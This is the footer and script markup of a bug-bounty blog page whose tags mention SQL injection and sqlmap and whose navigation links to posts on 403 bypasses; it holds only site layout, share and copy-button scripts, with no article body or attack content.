					<span class="cat-links">Posted in: <a href="https://ott3rly.com/category/blog/" rel="category tag">Blog</a>, <a href="https://ott3rly.com/category/bug-bounty-tips/" rel="category tag">Bug bounty tips</a>, <a href="https://ott3rly.com/category/infosec-tools/" rel="category tag">Infosec tools</a>, <a href="https://ott3rly.com/category/sqli/" rel="category tag">SQLi</a></span><span class="tags-links">Tagged: <a href="https://ott3rly.com/tag/bug-bounty/" rel="tag">Bug bounty</a>, <a href="https://ott3rly.com/tag/bug-bounty-hunting/" rel="tag">bug bounty hunting</a>, <a href="https://ott3rly.com/tag/bug-bounty-tips/" rel="tag">bug bounty tips</a>, <a href="https://ott3rly.com/tag/cybersecurity/" rel="tag">cybersecurity</a>, <a href="https://ott3rly.com/tag/information-security/" rel="tag">Information security</a>, <a href="https://ott3rly.com/tag/infosec/" rel="tag">infosec</a>, <a href="https://ott3rly.com/tag/sqli/" rel="tag">SQLi</a>, <a href="https://ott3rly.com/tag/sqlmap/" rel="tag">sqlmap</a></span>				</footer><!-- .entry-footer -->
			</div>
		</div>
	</article><!-- #post-783 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://ott3rly.com/common-403-bypasses-part-1/" rel="prev"><span class="nav-subtitle">Previous:</span> <span class="nav-title">Common 403 Bypasses Part 1</span></a></div><div class="nav-next"><a href="https://ott3rly.com/common-403-bypasses-part-2/" rel="next"><span class="nav-subtitle">Next:</span> <span class="nav-title">Common 403 Bypasses Part 2</span></a></div></div>
	</nav>
			</main><!-- #main -->
		</div>
			</div>
</div>

<script>
	document.addEventListener('DOMContentLoaded', function() {
		// Hide the profile-side div
		const profileSideDiv = document.querySelector('.profile-side');
		if (profileSideDiv) {
			profileSideDiv.style.display = 'none';
		}

		// Change the class of rxmain-content from col-lg-8 to col-lg-12
		const rxMainContentDiv = document.querySelector('.rxmain-content');
		if (rxMainContentDiv) {
			rxMainContentDiv.classList.remove('col-lg-8');
			rxMainContentDiv.classList.add('col-lg-12');
		}
	});
</script>


<footer id="colophon" class="site-footer pt-3 pb-3">
	<div class="container">
		<div class="site-info text-center">
			© 2024 Otterly. All rights reserved.

		</div><!-- .site-info -->
	</div><!-- .container -->
</footer><!-- #colophon -->
</div><!-- #page -->
</div><!-- col lg 8 -->
</div><!-- row div -->
</div><!-- main container -->
<div class="codeCopyTooltip" style="display: inline-block; background: #333; color: white; padding: 0 8px; font-size: 14px; border-radius: 2px; border: 1px solid #111; position:absolute; display: none;">Click to Copy</div>
<script type="text/javascript">
	function getElementPosition(el) {
		var rect = el.getBoundingClientRect(),
		scrollLeft = window.pageXOffset || document.documentElement.scrollLeft,
		scrollTop = window.pageYOffset || document.documentElement.scrollTop;
		return { top: rect.top + scrollTop - 30, left: rect.left + scrollLeft }
	}

	function applyCodeCopy(element) {
		element.addEventListener("click", function() {
			event.stopPropagation();
			const el = document.createElement('textarea');
			el.value = element.textContent;
			document.body.appendChild(el);
			el.select();
			document.execCommand('copy');
			document.body.removeChild(el);
			codeCopyTooltip.innerHTML = 'Copied!'
		});
		element.addEventListener("mouseover", function() {
			event.stopPropagation();
			var position = getElementPosition(element);
			codeCopyTooltip.innerHTML = 'Click to Copy';
			codeCopyTooltip.style.display = 'inline-block';
			codeCopyTooltip.style.top = position.top + 'px';
			codeCopyTooltip.style.left = position.left + 'px';
		});
		element.addEventListener("mouseout", function() {
			event.stopPropagation();
			var position = getElementPosition(element);
			codeCopyTooltip.style.display = 'none';
			codeCopyTooltip.style.top ='9999px';
		});
	}

	var codeCopyTooltip = document.querySelector('.codeCopyTooltip');

	document.querySelectorAll("code").forEach(function(element) {
		applyCodeCopy(element);
	});
</script>
<script src="https://ott3rly.com/wp-includes/js/imagesloaded.min.js?ver=5.0.0" id="imagesloaded-js"></script>
<script src="https://ott3rly.com/wp-includes/js/masonry.min.js?ver=4.2.2" id="masonry-js"></script>
<script src="https://ott3rly.com/wp-content/themes/resume-x/assets/js/bootstrap.js?ver=1.0.3" id="bootstrap-js"></script>
<script src="https://ott3rly.com/wp-content/themes/resume-x/assets/js/navigation.js?ver=1.0.3" id="resume-x-navigation-js"></script>
<script src="https://ott3rly.com/wp-content/themes/resume-x/assets/js/scripts.js?ver=1.0.3" id="resume-x-scripts-js"></script>
<script src="https://ott3rly.com/wp-content/themes/resume-x/assets/js/sticky-sidebar.js?ver=1.0.3" id="sticky-sidebar-js"></script>
<script id="heateor_sss_sharing_js-js-before">
function heateorSssLoadEvent(e) {var t=window.onload;if (typeof window.onload!="function") {window.onload=e}else{window.onload=function() {t();e()}}};	var heateorSssSharingAjaxUrl = 'https://ott3rly.com/wp-admin/admin-ajax.php', heateorSssCloseIconPath = 'https://ott3rly.com/wp-content/plugins/sassy-social-share/public/../images/close.png', heateorSssPluginIconPath = 'https://ott3rly.com/wp-content/plugins/sassy-social-share/public/../images/logo.png', heateorSssHorizontalSharingCountEnable = 0, heateorSssVerticalSharingCountEnable = 0, heateorSssSharingOffset = -10; var heateorSssMobileStickySharingEnabled = 0;var heateorSssCopyLinkMessage = "Link copied.";var heateorSssUrlCountFetched = [], heateorSssSharesText = 'Shares', heateorSssShareText = 'Share';function heateorSssPopup(e) {window.open(e,"popUpWindow","height=400,width=600,left=400,top=100,resizable,scrollbars,toolbar=0,personalbar=0,menubar=no,location=no,directories=no,status")}
</script>
<script src="https://ott3rly.com/wp-content/plugins/sassy-social-share/public/js/sassy-social-share-public.js?ver=3.3.66" id="heateor_sss_sharing_js-js"></script>

    <script type="text/javascript">
      (function($) {
        "use strict";
        $(document).ready(function() {
          $.scrollUp({
            scrollName: 'clickTop', // Element ID
            scrollDistance: 300, // Distance from top/bottom before showing element (px)
            scrollFrom: 'top', // 'top' or 'bottom'
            scrollSpeed: 300, // Speed back to top (ms)
            easingType: 'linear', // Scroll to top easing (see http://easings.net/)
            animation: 'fade', // Fade, slide, none
            animationSpeed: 200, // Animation speed (ms)
            scrollText: '<i class=" fa fa-angle-double-up"></i>', // Text for element, can contain HTML
            activeOverlay: false, // Set CSS color to display scrollUp active point, e.g '#00FFFF'
            zIndex: 2147483647 // Z-Index for the overlay
          });
          $('a#clickTop').addClass('hvr-bubble-top');
        });
      }(jQuery));
    </script>


</body>

</html>

<!-- Page cached by LiteSpeed Cache 6.4.1 on 2024-08-30 19:25:43 -->
